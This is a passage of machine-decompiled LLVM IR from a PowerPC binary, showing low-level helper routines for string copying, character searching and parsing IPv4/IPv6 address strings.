  ret i32 %v1_1000bfa4

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000bfcc
  %v2_1000bfe0 = inttoptr i32 %v1_1000bf90 to i8*
  %v3_1000bfe0 = load i8, i8* %v2_1000bfe0, align 1
  %v4_1000bfe0 = zext i8 %v3_1000bfe0 to i32
  %v4_1000bfe4 = icmp eq i32 %v4_1000bfe0, %v0_1000bf70
  br i1 %v4_1000bfe4, label %dec_label_pc_1000bfec, label %dec_label_pc_1000bff4

dec_label_pc_1000bfec:                            ; preds = %dec_label_pc_1000bfe0
  ret i32 %v1_1000bf90

dec_label_pc_1000bff4:                            ; preds = %dec_label_pc_1000bfe0
  %v2_1000bff4 = inttoptr i32 %v1_1000bfb8 to i8*
  %v3_1000bff4 = load i8, i8* %v2_1000bff4, align 1
  %v4_1000bff4 = zext i8 %v3_1000bff4 to i32
  %v4_1000bff8 = icmp eq i32 %v4_1000bff4, %v0_1000bf70
  br i1 %v4_1000bff8, label %dec_label_pc_1000c000, label %dec_label_pc_1000bf88

dec_label_pc_1000c000:                            ; preds = %dec_label_pc_1000bff4
  ret i32 %v1_1000bfb8

; uselistorder directives
  uselistorder i32 %v1_1000bf8c, { 1, 0 }
  uselistorder i32 %v0_1000bfc4, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000bf78, { 1, 0 }
  uselistorder i32 %v0_1000bf70, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000bf64, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000bf681, { 2, 1, 0 }
  uselistorder i32 %v1_1000bf50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bf58, { 1, 0 }
}

define i32 @function_1000c008(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c008:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c00c

dec_label_pc_1000c00c:                            ; preds = %dec_label_pc_1000c00c, %dec_label_pc_1000c008
  %v0_1000c00c = phi i32 [ %v1_1000c010, %dec_label_pc_1000c00c ], [ %tmp, %dec_label_pc_1000c008 ]
  %v1_1000c00c = inttoptr i32 %v0_1000c00c to i8*
  %v2_1000c00c = load i8, i8* %v1_1000c00c, align 1
  %v1_1000c010 = add i32 %v0_1000c00c, 1
  store i32 %v1_1000c010, i32* %r11.global-to-local, align 4
  %v3_1000c014 = icmp eq i8 %v2_1000c00c, 0
  store i1 %v3_1000c014, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c014, label %dec_label_pc_1000c01c, label %dec_label_pc_1000c00c

dec_label_pc_1000c01c:                            ; preds = %dec_label_pc_1000c00c
  %v3_1000c01c = icmp eq i32 %arg2, 3
  store i1 %v3_1000c01c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c020 = add i32 %v0_1000c00c, -1
  store i32 %v1_1000c020, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000c0bc, label %dec_label_pc_1000c02c

dec_label_pc_1000c02c:                            ; preds = %dec_label_pc_1000c01c
  %v1_1000c02c = udiv i32 %arg2, 4
  store i32 %v1_1000c02c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c034

dec_label_pc_1000c034:                            ; preds = %dec_label_pc_1000c034.dec_label_pc_1000c034_crit_edge, %dec_label_pc_1000c02c
  %v2_1000c044 = phi i32 [ %v0_1000c038.pre, %dec_label_pc_1000c034.dec_label_pc_1000c034_crit_edge ], [ %v1_1000c020, %dec_label_pc_1000c02c ]
  %v0_1000c034 = load i32, i32* @r4, align 4
  %v1_1000c034 = inttoptr i32 %v0_1000c034 to i8*
  %v2_1000c034 = load i8, i8* %v1_1000c034, align 1
  %v1_1000c038 = add i32 %v2_1000c044, 1
  store i32 %v1_1000c038, i32* %r9.global-to-local, align 4
  %v1_1000c03c = add i32 %v2_1000c044, 2
  store i32 %v1_1000c03c, i32* %r7.global-to-local, align 4
  %v3_1000c040 = icmp eq i8 %v2_1000c034, 0
  store i1 %v3_1000c040, i1* %cr7_eq.global-to-local, align 1
  %v4_1000c044 = inttoptr i32 %v1_1000c038 to i8*
  store i8 %v2_1000c034, i8* %v4_1000c044, align 1
  %v0_1000c048 = load i32, i32* @r4, align 4
  %v1_1000c048 = add i32 %v0_1000c048, 1
  store i32 %v1_1000c048, i32* %r11.global-to-local, align 4
  %v0_1000c04c = load i32, i32* @lr, align 4
  %v1_1000c04c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c04c, i32 %v0_1000c04c)
  %v0_1000c050 = load i32, i32* @r4, align 4
  %v1_1000c050 = add i32 %v0_1000c050, 1
  %v2_1000c050 = inttoptr i32 %v1_1000c050 to i8*
  %v3_1000c050 = load i8, i8* %v2_1000c050, align 1
  %v0_1000c054 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c054 = add i32 %v0_1000c054, 1
  store i32 %v1_1000c054, i32* %r8.global-to-local, align 4
  %v0_1000c058 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c058 = add i32 %v0_1000c058, 1
  store i32 %v1_1000c058, i32* %r10.global-to-local, align 4
  %v3_1000c05c = icmp eq i8 %v3_1000c050, 0
  store i1 %v3_1000c05c, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c060 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c060 = add i32 %v2_1000c060, 1
  %v4_1000c060 = inttoptr i32 %v3_1000c060 to i8*
  store i8 %v3_1000c050, i8* %v4_1000c060, align 1
  %v0_1000c064 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c064 = add i32 %v0_1000c064, 1
  store i32 %v1_1000c064, i32* %r9.global-to-local, align 4
  %v1_1000c068 = add i32 %v0_1000c064, 2
  store i32 %v1_1000c068, i32* @r4, align 4
  %v0_1000c06c = load i32, i32* @lr, align 4
  %v1_1000c06c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c06c, i32 %v0_1000c06c)
  %v0_1000c070 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c070 = add i32 %v0_1000c070, 1
  %v2_1000c070 = inttoptr i32 %v1_1000c070 to i8*
  %v3_1000c070 = load i8, i8* %v2_1000c070, align 1
  %v0_1000c074 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c074 = add i32 %v0_1000c074, 1
  store i32 %v1_1000c074, i32* %r11.global-to-local, align 4
  %v3_1000c078 = icmp eq i8 %v3_1000c070, 0
  store i1 %v3_1000c078, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c07c = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c07c = add i32 %v2_1000c07c, 1
  %v4_1000c07c = inttoptr i32 %v3_1000c07c to i8*
  store i8 %v3_1000c070, i8* %v4_1000c07c, align 1
  %v0_1000c080 = load i32, i32* @lr, align 4
  %v1_1000c080 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c080, i32 %v0_1000c080)
  %v0_1000c084 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c084 = add i32 %v0_1000c084, 1
  %v2_1000c084 = inttoptr i32 %v1_1000c084 to i8*
  %v3_1000c084 = load i8, i8* %v2_1000c084, align 1
  %v4_1000c084 = zext i8 %v3_1000c084 to i32
  store i32 %v4_1000c084, i32* %r9.global-to-local, align 4
  %v3_1000c088 = icmp eq i8 %v3_1000c084, 0
  store i1 %v3_1000c088, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c08c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000c08c = add i32 %v2_1000c08c, 1
  %v4_1000c08c = inttoptr i32 %v3_1000c08c to i8*
  store i8 %v3_1000c084, i8* %v4_1000c08c, align 1
  %v0_1000c090 = load i32, i32* @lr, align 4
  %v1_1000c090 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c090, i32 %v0_1000c090)
  %v0_1000c094 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c094 = add i32 %v0_1000c094, -1
  store i32 %v1_1000c094, i32* %ctr.global-to-local, align 4
  %v2_1000c094 = icmp eq i32 %v1_1000c094, 0
  br i1 %v2_1000c094, label %dec_label_pc_1000c098, label %dec_label_pc_1000c034.dec_label_pc_1000c034_crit_edge

dec_label_pc_1000c034.dec_label_pc_1000c034_crit_edge: ; preds = %dec_label_pc_1000c034
  %v0_1000c038.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c034

dec_label_pc_1000c098:                            ; preds = %dec_label_pc_1000c034
  %v0_1000c098 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c098 = urem i32 %v0_1000c098, 4
  store i32 %v1_1000c098, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c0bc

dec_label_pc_1000c0a0:                            ; preds = %dec_label_pc_1000c0bc, %dec_label_pc_1000c0a0.dec_label_pc_1000c0a0_crit_edge
  %v0_1000c0a4 = phi i32 [ %v0_1000c0a4.pre, %dec_label_pc_1000c0a0.dec_label_pc_1000c0a0_crit_edge ], [ %v0_1000c0bc, %dec_label_pc_1000c0bc ]
  %v0_1000c0a0 = load i32, i32* @r4, align 4
  %v1_1000c0a0 = inttoptr i32 %v0_1000c0a0 to i8*
  %v2_1000c0a0 = load i8, i8* %v1_1000c0a0, align 1
  %v3_1000c0a0 = zext i8 %v2_1000c0a0 to i32
  store i32 %v3_1000c0a0, i32* %r9.global-to-local, align 4
  %v1_1000c0a4 = add i32 %v0_1000c0a4, -1
  store i32 %v1_1000c0a4, i32* %r5.global-to-local, align 4
  %v1_1000c0a8 = add i32 %v0_1000c0a0, 1
  store i32 %v1_1000c0a8, i32* @r4, align 4
  %v3_1000c0ac = icmp eq i8 %v2_1000c0a0, 0
  store i1 %v3_1000c0ac, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c0b0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c0b0 = add i32 %v2_1000c0b0, 1
  %v4_1000c0b0 = inttoptr i32 %v3_1000c0b0 to i8*
  store i8 %v2_1000c0a0, i8* %v4_1000c0b0, align 1
  store i32 %v3_1000c0b0, i32* %r11.global-to-local, align 4
  %v0_1000c0b4 = load i32, i32* @lr, align 4
  %v1_1000c0b4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000c0b4, i32 %v0_1000c0b4)
  %v0_1000c0c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c0c4 = add i32 %v0_1000c0c4, -1
  store i32 %v1_1000c0c4, i32* %ctr.global-to-local, align 4
  %v2_1000c0c4 = icmp eq i32 %v1_1000c0c4, 0
  br i1 %v2_1000c0c4, label %dec_label_pc_1000c0c8, label %dec_label_pc_1000c0a0.dec_label_pc_1000c0a0_crit_edge

dec_label_pc_1000c0a0.dec_label_pc_1000c0a0_crit_edge: ; preds = %dec_label_pc_1000c0a0
  %v0_1000c0a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c0a0

dec_label_pc_1000c0bc:                            ; preds = %dec_label_pc_1000c01c, %dec_label_pc_1000c098
  %v0_1000c0bc = phi i32 [ %arg2, %dec_label_pc_1000c01c ], [ %v1_1000c098, %dec_label_pc_1000c098 ]
  store i32 %v0_1000c0bc, i32* %ctr.global-to-local, align 4
  %v2_1000c0c43 = icmp eq i32 %v0_1000c0bc, 0
  br i1 %v2_1000c0c43, label %dec_label_pc_1000c0c8, label %dec_label_pc_1000c0a0

dec_label_pc_1000c0c8:                            ; preds = %dec_label_pc_1000c0a0, %dec_label_pc_1000c0bc
  %v0_1000c0c8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c0c8 = icmp eq i32 %v0_1000c0c8, 0
  store i1 %v3_1000c0c8, i1* %cr7_eq.global-to-local, align 1
  %v0_1000c0cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c0c8, i32 %v0_1000c0cc)
  %v0_1000c0d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c0d0 = trunc i32 %v0_1000c0d0 to i8
  %v2_1000c0d0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c0d0 = add i32 %v2_1000c0d0, 1
  %v4_1000c0d0 = inttoptr i32 %v3_1000c0d0 to i8*
  store i8 %v1_1000c0d0, i8* %v4_1000c0d0, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000c0bc, { 1, 2, 0 }
  uselistorder i32 %v1_1000c0c4, { 1, 0 }
  uselistorder i32 %v1_1000c098, { 1, 0 }
  uselistorder i32 %v1_1000c094, { 1, 0 }
  uselistorder i32 %v2_1000c044, { 1, 0 }
  uselistorder i32 %v1_1000c010, { 1, 0 }
  uselistorder i32 %v0_1000c00c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000c0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0bc, { 1, 0 }
}

define i32 @function_1000c0d8(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000c0d8:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000c1081 = load i32, i32* @r3, align 4
  %v1_1000c1082 = inttoptr i32 %v0_1000c1081 to i8*
  %v2_1000c1083 = load i8, i8* %v1_1000c1082, align 1
  %v3_1000c10c6 = icmp eq i8 %v2_1000c1083, 0
  br i1 %v3_1000c10c6, label %dec_label_pc_1000c11c, label %dec_label_pc_1000c114

dec_label_pc_1000c0e4:                            ; preds = %dec_label_pc_1000c0e4, %dec_label_pc_1000c114
  %v0_1000c0e4 = phi i32 [ %v1_1000c0e8, %dec_label_pc_1000c0e4 ], [ %tmp, %dec_label_pc_1000c114 ]
  %v1_1000c0e4 = inttoptr i32 %v0_1000c0e4 to i8*
  %v2_1000c0e4 = load i8, i8* %v1_1000c0e4, align 1
  %v1_1000c0e8 = add i32 %v0_1000c0e4, 1
  %v3_1000c0ec = icmp eq i8 %v2_1000c0e4, 0
  %v4_1000c0f0 = icmp eq i8 %v0_1000c0f08.in, %v2_1000c0e4
  %brmerge = or i1 %v3_1000c0ec, %v4_1000c0f0
  br i1 %brmerge, label %dec_label_pc_1000c0f8, label %dec_label_pc_1000c0e4

dec_label_pc_1000c0f8:                            ; preds = %dec_label_pc_1000c0e4
  br i1 %v3_1000c0ec, label %dec_label_pc_1000c11c, label %dec_label_pc_1000c100

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c0f8
  %v1_1000c100 = add i32 %v0_1000c100, 1
  %v1_1000c104 = add i32 %v0_1000c104, 1
  %v1_1000c108 = inttoptr i32 %v1_1000c104 to i8*
  %v2_1000c108 = load i8, i8* %v1_1000c108, align 1
  %v3_1000c10c = icmp eq i8 %v2_1000c108, 0
  br i1 %v3_1000c10c, label %dec_label_pc_1000c11c, label %dec_label_pc_1000c114

dec_label_pc_1000c114:                            ; preds = %dec_label_pc_1000c0d8, %dec_label_pc_1000c100
  %v0_1000c104 = phi i32 [ %v1_1000c104, %dec_label_pc_1000c100 ], [ %v0_1000c1081, %dec_label_pc_1000c0d8 ]
  %v0_1000c100 = phi i32 [ %v1_1000c100, %dec_label_pc_1000c100 ], [ 0, %dec_label_pc_1000c0d8 ]
  %v0_1000c0f08.in = phi i8 [ %v2_1000c108, %dec_label_pc_1000c100 ], [ %v2_1000c1083, %dec_label_pc_1000c0d8 ]
  br label %dec_label_pc_1000c0e4

dec_label_pc_1000c11c:                            ; preds = %dec_label_pc_1000c100, %dec_label_pc_1000c0f8, %dec_label_pc_1000c0d8
  %v0_1000c11c = phi i32 [ 0, %dec_label_pc_1000c0d8 ], [ %v1_1000c100, %dec_label_pc_1000c100 ], [ %v0_1000c100, %dec_label_pc_1000c0f8 ]
  ret i32 %v0_1000c11c

; uselistorder directives
  uselistorder i32 %v0_1000c0e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c114, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0e4, { 1, 0 }
}

define i32 @function_1000c124(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c124:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c124 = load i32, i32* @lr, align 4
  store i32 %v0_1000c124, i32* %r0.global-to-local, align 4
  %v0_1000c12c = call i32 @__asm_mfcr()
  store i32 %v0_1000c12c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000c138 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000c138, i32* %r7.global-to-local, align 4
  %v0_1000c13c = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c1a4

dec_label_pc_1000c154:                            ; preds = %dec_label_pc_1000c1a4
  %v3_1000c154 = icmp eq i32 %v0_1000c1c8, 4
  store i1 %v3_1000c154, i1* %cr7_eq.global-to-local, align 1
  %v0_1000c158 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000c158, label %dec_label_pc_1000c190, label %dec_label_pc_1000c15c

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c154
  %v0_1000c15c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c15c = inttoptr i32 %v0_1000c15c to i8*
  %v2_1000c15c = load i8, i8* %v1_1000c15c, align 1
  %v3_1000c15c = zext i8 %v2_1000c15c to i32
  %v1_1000c160 = mul nuw nsw i32 %v3_1000c15c, 10
  %v1_1000c164 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c164 = add i32 %v1_1000c160, %v1_1000c164
  %v1_1000c168 = add i32 %v2_1000c164, -48
  store i32 %v1_1000c168, i32* %r0.global-to-local, align 4
  %v2_1000c16c = icmp ugt i32 %v1_1000c168, 255
  %v3_1000c16c = icmp eq i32 %v1_1000c168, 255
  store i1 %v3_1000c16c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c16c, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c174

dec_label_pc_1000c174:                            ; preds = %dec_label_pc_1000c15c
  %v1_1000c174 = trunc i32 %v1_1000c168 to i8
  store i8 %v1_1000c174, i8* %v1_1000c15c, align 1
  %v0_1000c178 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000c178, label %dec_label_pc_1000c17c, label %dec_label_pc_1000c1a4.backedge

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c174
  %v0_1000c17c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c17c = add i32 %v0_1000c17c, 1
  store i32 %v1_1000c17c, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000c184 = icmp sgt i32 %v1_1000c17c, 4
  %v3_1000c184 = icmp eq i32 %v1_1000c17c, 4
  store i1 %v3_1000c184, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c184, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c1a4.backedge

dec_label_pc_1000c190:                            ; preds = %dec_label_pc_1000c154
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1000c194 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1000c194.not = xor i1 %v0_1000c194, true
  %v0_1000c198 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000c154, %v0_1000c198
  %or.cond = or i1 %brmerge, %v0_1000c194.not
  br i1 %or.cond, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c1a0

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c190
  %v0_1000c1a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c1a0 = trunc i32 %v0_1000c1a0 to i8
  %v2_1000c1a0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c1a0 = add i32 %v2_1000c1a0, 1
  %v4_1000c1a0 = inttoptr i32 %v3_1000c1a0 to i8*
  store i8 %v1_1000c1a0, i8* %v4_1000c1a0, align 1
  store i32 %v3_1000c1a0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c1a4.backedge

dec_label_pc_1000c1a4.backedge:                   ; preds = %dec_label_pc_1000c1a0, %dec_label_pc_1000c174, %dec_label_pc_1000c17c
  %v0_1000c1a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000c1a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000c1a4

dec_label_pc_1000c1a4:                            ; preds = %dec_label_pc_1000c1a4.backedge, %dec_label_pc_1000c124
  %v0_1000c1a8 = phi i32 [ %v0_1000c1a8.pre, %dec_label_pc_1000c1a4.backedge ], [ 0, %dec_label_pc_1000c124 ]
  %v0_1000c1ac = phi i32 [ %v0_1000c1a4.pre, %dec_label_pc_1000c1a4.backedge ], [ %v0_1000c12c, %dec_label_pc_1000c124 ]
  %v1_1000c1a4 = inttoptr i32 %v0_1000c1ac to i8*
  %v2_1000c1a4 = load i8, i8* %v1_1000c1a4, align 1
  %v3_1000c1a4 = zext i8 %v2_1000c1a4 to i32
  store i32 %v3_1000c1a4, i32* %r11.global-to-local, align 4
  %v3_1000c1a8 = icmp eq i32 %v0_1000c1a8, 0
  store i1 %v3_1000c1a8, i1* %cr4_eq.global-to-local, align 1
  %v1_1000c1ac = add i32 %v0_1000c1ac, 1
  store i32 %v1_1000c1ac, i32* %r3.global-to-local, align 4
  %v3_1000c1b0 = icmp eq i8 %v2_1000c1a4, 0
  store i1 %v3_1000c1b0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c1b4 = add nsw i32 %v3_1000c1a4, -48
  store i32 %v1_1000c1b4, i32* %r0.global-to-local, align 4
  %v2_1000c1b8 = icmp ugt i32 %v1_1000c1b4, 9
  store i1 %v2_1000c1b8, i1* %cr6_gt.global-to-local, align 1
  %v3_1000c1bc = icmp eq i8 %v2_1000c1a4, 46
  store i1 %v3_1000c1bc, i1* %cr1_eq.global-to-local, align 1
  %v0_1000c1c0 = load i4, i4* @cr4, align 1
  %v1_1000c1c0 = call %2 @__asm_mcrf_cr0_write(i4 %v0_1000c1c0)
  %v4_1000c1c0 = extractvalue %2 %v1_1000c1c0, 2
  store i1 %v4_1000c1c0, i1* %cr0_eq.global-to-local, align 1
  %v0_1000c1c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1000c1c8 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000c1c4, label %dec_label_pc_1000c1c8, label %dec_label_pc_1000c154

dec_label_pc_1000c1c8:                            ; preds = %dec_label_pc_1000c1a4
  %v3_1000c1c8 = icmp eq i32 %v0_1000c1c8, 3
  store i1 %v3_1000c1c8, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1000c1c8, 4
  br i1 %tmp9, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c1d0

dec_label_pc_1000c1d0:                            ; preds = %dec_label_pc_1000c1c8
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000c138, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c1e0.337 to i32), i32* @lr, align 4
  %v0_1000c1dc = call i32 @function_10007108()
  br label %dec_label_pc_1000c1ec

dec_label_pc_1000c1ec:                            ; preds = %dec_label_pc_1000c190, %dec_label_pc_1000c15c, %dec_label_pc_1000c17c, %dec_label_pc_1000c1c8, %dec_label_pc_1000c1d0
  %storemerge = phi i32 [ 1, %dec_label_pc_1000c1d0 ], [ 0, %dec_label_pc_1000c1c8 ], [ 0, %dec_label_pc_1000c17c ], [ 0, %dec_label_pc_1000c15c ], [ 0, %dec_label_pc_1000c190 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1000c13c, i32* %r0.global-to-local, align 4
  %v1_1000c1fc = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000c12c)
  %v4_1000c1fc = extractvalue %0 %v1_1000c1fc, 2
  store i1 %v4_1000c1fc, i1* %cr0_eq.global-to-local, align 1
  %v9_1000c1fc = extractvalue %0 %v1_1000c1fc, 7
  store i4 %v9_1000c1fc, i4* @cr4, align 1
  %v0_1000c200 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c200

; uselistorder directives
  uselistorder i32 %v1_1000c17c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c168, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000c12c, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c1ec, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c1a4.backedge, { 0, 2, 1 }
}

define i32 @function_1000c204(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c204:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1000c204 = icmp eq i32 %arg1, 2
  %v0_1000c208 = load i32, i32* @lr, align 4
  store i32 %v0_1000c208, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000c204, label %dec_label_pc_1000c230, label %dec_label_pc_1000c224

dec_label_pc_1000c224:                            ; preds = %dec_label_pc_1000c204
  %v3_1000c224 = icmp eq i32 %arg1, 10
  br i1 %v3_1000c224, label %dec_label_pc_1000c244, label %dec_label_pc_1000c3e0

dec_label_pc_1000c230:                            ; preds = %dec_label_pc_1000c204
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268485180, i32* @lr, align 4
  %v3_1000c238 = call i32 @function_1000c124(i32 %tmp, i32 %arg3)
  store i32 %v3_1000c238, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c238, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c3f8

dec_label_pc_1000c244:                            ; preds = %dec_label_pc_1000c224
  %v2_1000c244 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000c244, i32* %r3.global-to-local, align 4
  store i32 268485204, i32* @lr, align 4
  %v3_1000c250 = call i32 @function_100071a4(i32 %v2_1000c244, i32 0, i32 16)
  store i32 %v3_1000c250, i32* %r3.global-to-local, align 4
  %v0_1000c254 = load i32, i32* @r29, align 4
  %v1_1000c254 = inttoptr i32 %v0_1000c254 to i8*
  %v2_1000c254 = load i8, i8* %v1_1000c254, align 1
  %v3_1000c254 = zext i8 %v2_1000c254 to i32
  store i32 %v3_1000c254, i32* %r0.global-to-local, align 4
  store i32 %v3_1000c250, i32* @r31, align 4
  %v2_1000c25c = add i32 %v3_1000c250, 16
  store i32 %v2_1000c25c, i32* @r27, align 4
  %v3_1000c260 = icmp eq i8 %v2_1000c254, 58
  br i1 %v3_1000c260, label %dec_label_pc_1000c268, label %dec_label_pc_1000c274

dec_label_pc_1000c268:                            ; preds = %dec_label_pc_1000c244
  %v1_1000c268 = add i32 %v0_1000c254, 1
  %v2_1000c268 = inttoptr i32 %v1_1000c268 to i8*
